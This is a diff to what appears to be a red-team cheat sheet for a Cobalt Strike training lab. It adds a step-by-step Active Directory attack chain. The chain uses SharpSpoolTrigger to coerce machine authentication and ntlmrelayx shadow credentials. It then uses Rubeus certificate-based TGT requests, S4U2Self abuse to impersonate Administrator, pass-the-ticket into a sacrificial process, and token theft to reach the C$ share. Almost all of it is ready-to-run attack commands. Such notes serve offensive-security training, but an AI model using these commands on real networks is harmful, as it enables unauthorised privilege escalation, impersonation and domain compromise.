@@ -1114,8 +1114,21 @@ attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shad
 # 2. Encode certificate to base64 to be used with Rubeus
 attacker@ubuntu ~> cat ROsU1G59.pfx | base64 -w 0
 
-# 3. Request a TGT to be used with S4U2Self
+# 3. Use SharpSpoolTrigger to coerce authentication from WKSTN-1 to WKSTN-2
+beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwned
+
+# 4. Request a TGT to be used with S4U2Self
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIII3Q[...snip...]YFLqI= /password:wBaP2YhsR7RgY0MZ6jwk /nowrap
+
+# 5. Use Machine TGT on S4U2Self Abuse
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/wkstn-1.dev.cyberbotic.io /user:wkstn-1$ /nowrap /ticket:doIFLD[...snip...]MuSU8=
+
+# 6. Create the sacrificial process and Pass The Ticket
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:Administrator /password:FakePass /ticket:doIFLD[...snip...]MuSU8=
+
+# 7. Impersonate session and validate access to wkstn-1
+beacon> steal_token 7743
+beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
 
 # Ensure the keys are deleted after the attack.
 ```
